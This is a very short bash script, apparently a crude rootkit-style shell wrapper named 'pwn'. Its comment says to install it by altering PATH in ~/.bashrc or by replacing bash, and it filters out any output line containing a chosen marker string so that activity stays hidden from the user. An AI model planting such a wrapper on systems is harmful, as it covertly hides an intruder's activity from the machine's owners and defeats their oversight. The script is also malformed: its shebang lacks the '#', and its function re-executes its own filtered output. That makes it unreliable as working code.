!/bin/bash
# edit ~/.bashrc PATH or replace bash
function pwn(){
	`echo "$@"|grep -v THINGTOHIDE 2>&1`;
}
pwn "$@"|grep -v THINGTOHIDE
